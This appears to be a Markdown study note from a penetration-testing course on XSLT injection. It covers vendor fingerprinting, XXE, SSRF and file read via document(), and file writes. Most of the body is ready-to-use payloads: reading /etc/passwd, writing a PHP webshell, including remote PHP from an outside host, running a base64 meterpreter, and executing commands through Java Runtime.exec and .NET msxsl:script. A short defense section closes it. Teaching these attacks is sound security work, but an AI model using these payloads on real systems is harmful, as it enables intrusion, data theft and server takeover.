---
tags: [vapt, injection, xslt, xxe, ssrf, rce, file-read, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.20 XSLT Injection"
---

# 10.20 — XSLT Injection

## What is it?
**XSLT** (eXtensible Stylesheet Language Transformations) is a language for transforming XML into other formats (HTML, text, other XML). The server takes an XML document + an XSL **stylesheet** and runs a *transformation*. XSLT is a real programming language — it has functions, can read external files, make network requests, and (via vendor extensions) call into PHP / Java / .NET.

**XSLT Injection** happens when an attacker controls part of the stylesheet (or the XML it processes). Because the XSLT processor is so powerful, control over it escalates straight to **file read, SSRF, file write, and full RCE** — much like SSTI but in the XML world.

Think of a stylesheet as a recipe the kitchen follows blindly. If you can write lines into the recipe, you can tell the kitchen to "read the safe's contents aloud" (file read), "phone this number" (SSRF), or "run this shell command" (RCE).

> Rule: whenever you see XSLT, also test for **XXE** — the two live in the same XML processor.

## Step 1 — Fingerprint vendor & version
Different processors (libxslt, Saxon, Xalan, .NET MSXML, PHP) support different attacks. Identify first:
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```
Fuller probe (version, vendor, vendor-url):
```xml
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

## Step 2 — XXE / External Entity
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits &ext_file;:
    <xsl:for-each select="fruit">
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

## Step 3 — File read & SSRF via `document()`
The `document()` function fetches a URL or path and embeds it in the output:
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>      <!-- SSRF / port probe -->
    <xsl:copy-of select="document('/etc/passwd')"/>                 <!-- file read (nix) -->
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>    <!-- file read (win) -->
  </xsl:template>
</xsl:stylesheet>
```

## Step 4 — File write via EXSLT
EXSLT extensions can write files to disk — drop a webshell:
```xml
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit" version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text">
      Hello World!
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

## Step 5 — RCE by engine

### PHP wrapper (`php:function`)
```xml
<!-- readfile -->
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body><xsl:value-of select="php:function('readfile','index.php')" /></body>
</html>
```
```xml
<!-- scandir -->
<xsl:value-of name="assert" select="php:function('scandir', '.')"/>
```
```xml
<!-- assert -> include remote PHP -->
<xsl:variable name="payload">include("http://10.10.10.10/test.php")</xsl:variable>
<xsl:variable name="include" select="php:function('assert',$payload)"/>
```
```xml
<!-- write a webshell -->
<xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php',
  '&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
```
```xml
<!-- preg_replace /e -> meterpreter -->
<xsl:variable name="eval">eval(base64_decode('BASE64_METERPRETER'))</xsl:variable>
<xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
```

### Java (Xalan / Saxon → `Runtime.exec`)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
    <xsl:variable name="processString" select="ob:toString($process)"/>
    <xsl:value-of select="$processString"/>
  </xsl:template>
</xsl:stylesheet>
```
```xml
<!-- Saxon v2 -->
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')"
  xmlns:Runtime="java:java.lang.Runtime"/>
```

### .NET native (`msxsl:script` C#)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:my-scripts">
<msxsl:script language="C#" implements-prefix="user"><![CDATA[
public string execute(){
  System.Diagnostics.Process proc = new System.Diagnostics.Process();
  proc.StartInfo.FileName="C:\\windows\\system32\\cmd.exe";
  proc.StartInfo.RedirectStandardOutput = true;
  proc.StartInfo.UseShellExecute = false;
  proc.StartInfo.Arguments = "/c dir";
  proc.Start(); proc.WaitForExit();
  return proc.StandardOutput.ReadToEnd();
}
]]></msxsl:script>
  <xsl:template match="/fruits">
    --- BEGIN OUTPUT --- <xsl:value-of select="user:execute()"/> --- END OUTPUT ---
  </xsl:template>
</xsl:stylesheet>
```

## ASCII Diagram
```text
================================================================================
                          XSLT INJECTION ESCALATION
================================================================================

  control stylesheet/XML
          |
          v
  [XSLT processor] --system-property()--> fingerprint vendor/version
          |
          +--> &entity; / DOCTYPE ............ XXE  (file read, SSRF)
          +--> document('file://' | 'http://') file read + SSRF
          +--> EXSLT exploit:document ......... FILE WRITE (drop webshell)
          +--> php:function / Runtime:exec /
               msxsl:script C# ................ REMOTE CODE EXECUTION
================================================================================
```

## Hands-on workflow
1. Find a feature that transforms XML with a stylesheet (report/export/PDF/RSS render).
2. Inject the **vendor probe** — confirm the output reflects `xsl:vendor`.
3. Test **XXE** and **`document()`** for file read / SSRF (start with `/etc/passwd`).
4. Per engine: PHP → `php:function`, Java → `Runtime:exec`, .NET → `msxsl:script`. Try **EXSLT write** to drop a shell where `php:function` is blocked.
5. Practice: Root-Me "XSLT - Code execution".

## Defense
- **Disable dangerous features:** turn off external entity resolution, the `document()` function, and vendor scripting extensions (PHP funcs, Java/.NET bindings, EXSLT write). e.g. libxml `XSLT_SECPREF_*`, .NET `XsltSettings.Default` (no scripts/document).
- **Never** let users supply or influence the stylesheet. Treat XSL as code.
- Run the transform in a sandbox / low-priv user, no outbound network.

## Related
- [[../I - 14 - XXE/01 - What is XXE]] — always co-test with XSLT
- [[19 - Server-Side Includes (SSI) and Edge-Side Includes (ESI) Injection]] — ESI can chain into XSLT→XXE
- [[../I - 13 - SSRF/01 - What is SSRF]] — `document()` is an SSRF primitive
